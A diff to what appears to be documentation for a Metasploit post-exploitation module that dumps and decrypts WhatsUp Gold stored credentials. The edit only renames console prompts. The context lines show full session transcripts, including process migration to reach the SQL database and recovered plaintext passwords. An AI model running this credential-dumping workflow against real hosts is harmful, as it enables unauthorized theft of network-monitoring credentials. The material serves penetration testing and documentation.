@@ -114,10 +114,10 @@ Windows Server 2019 host running WhatsUp Gold Build 22.1.39 with external databa
 and SQL native authentication using the `dump` action:
 
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/credentials/whatsupgold_credential_dump
-msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > set session 1
+msf exploit(multi/handler) > use post/windows/gather/credentials/whatsupgold_credential_dump
+msf post(windows/gather/credentials/whatsupgold_credential_dump) > set session 1
 session => 1
-msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > dump
+msf post(windows/gather/credentials/whatsupgold_credential_dump) > dump
 
 [*] Hostname WUG IPv4 192.168.101.137
 [*] WhatsUp Gold Build 22.1.39
@@ -156,7 +156,7 @@ msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > dump
 [+]     P: quit2day!
 [+] Decrypted WhatsUp Gold Database Dump: /root/.msf4/loot/20221218103644_default_192.168.101.137_whatsup_gold_dec_398808.txt
 [*] Post module execution completed
-msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > 
+msf post(windows/gather/credentials/whatsupgold_credential_dump) > 
 ```
 
 Windows Server 2019 with MSSQL SSPI authentication configured for SQL database -
@@ -164,10 +164,10 @@ migrate the session PID to an identity with permission to log on to the SQL serv
 before executing the `dump` action:
 
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/credentials/whatsupgold_credential_dump
-msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > set session 1
+msf exploit(multi/handler) > use post/windows/gather/credentials/whatsupgold_credential_dump
+msf post(windows/gather/credentials/whatsupgold_credential_dump) > set session 1
 session => 1
-msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > dump
+msf post(windows/gather/credentials/whatsupgold_credential_dump) > dump
 
 [*] Hostname WINNEBAGO IPv4 192.168.101.125
 [*] WhatsUp Gold Build 22.1.39
@@ -190,7 +190,7 @@ msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > dump
 [-] Post aborted due to failure: unknown: Sqlcmd: Error: Microsoft ODBC Driver 13 for SQL Server : Login failed for user 'CESIUM137\WINNEBAGO$'..
 Sqlcmd: Error: Microsoft ODBC Driver 13 for SQL Server : Cannot open database "WhatsUp" requested by the login. The login failed..
 [*] Post module execution completed
-msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > sessions -i 1
+msf post(windows/gather/credentials/whatsupgold_credential_dump) > sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter > ps
@@ -210,7 +210,7 @@ meterpreter > migrate 7908
 [*] Migration completed successfully.
 meterpreter > bg
 [*] Backgrounding session 1...
-msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > dump
+msf post(windows/gather/credentials/whatsupgold_credential_dump) > dump
 
 [*] Hostname WINNEBAGO IPv4 192.168.101.125
 [*] WhatsUp Gold Build 22.1.39
@@ -250,17 +250,17 @@ msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > dump
 [+]     P: quit2day!
 [+] Decrypted WhatsUp Gold Database Dump: /root/.msf4/loot/20221218104026_default_192.168.101.125_whatsup_gold_dec_104164.txt
 [*] Post module execution completed
-msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > 
+msf post(windows/gather/credentials/whatsupgold_credential_dump) > 
 ```
 
 Host running Windows Server 2003 R2 and WhatsUp Premium 11.0.1.11231 with MSDE;
 the operator must supply the export data via the `CSV_FILE` advanced option:
 
 ```
-msf6 exploit(multi/handler) > use post/windows/gather/credentials/whatsupgold_credential_dump
-msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > set session 1
+msf exploit(multi/handler) > use post/windows/gather/credentials/whatsupgold_credential_dump
+msf post(windows/gather/credentials/whatsupgold_credential_dump) > set session 1
 session => 1
-msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > dump
+msf post(windows/gather/credentials/whatsupgold_credential_dump) > dump
 
 [*] Hostname WINCEMEAT IPv4 192.168.101.144
 [*] WhatsUp Gold Build 11.00.0004
@@ -275,15 +275,15 @@ msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > dump
 [!] Session identity must have access to the SQL server instance to proceed
 [-] Post aborted due to failure: bad-config: Unable to identify sqlcmd SQL client on target host
 [*] Post module execution completed
-msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > 
+msf post(windows/gather/credentials/whatsupgold_credential_dump) > 
 ```
 
 The operator extracts the SQL data from the database into `/tmp/wug_dump.csv` out of band.
 
 ```
-msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > set CSV_FILE /tmp/wug_dump.csv
+msf post(windows/gather/credentials/whatsupgold_credential_dump) > set CSV_FILE /tmp/wug_dump.csv
 CSV_FILE => /tmp/wug_dump.csv
-msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > decrypt
+msf post(windows/gather/credentials/whatsupgold_credential_dump) > decrypt
 
 [*] Hostname WINCEMEAT IPv4 192.168.101.144
 [*] WhatsUp Gold Build 11.00.0004
@@ -301,5 +301,5 @@ msf6 post(windows/gather/credentials/whatsupgold_credential_dump) > decrypt
 [+]     P: WuddidUSay2Me?!
 [+] Decrypted WhatsUp Gold Database Dump: /root/.msf4/loot/20221219112059_default_192.168.101.144_whatsup_gold_dec_615423.txt
 [*] Post module execution completed
-msf6 post(windows/gather/credentials/whatsupgold_credential_dump) >
+msf post(windows/gather/credentials/whatsupgold_credential_dump) >
 ```
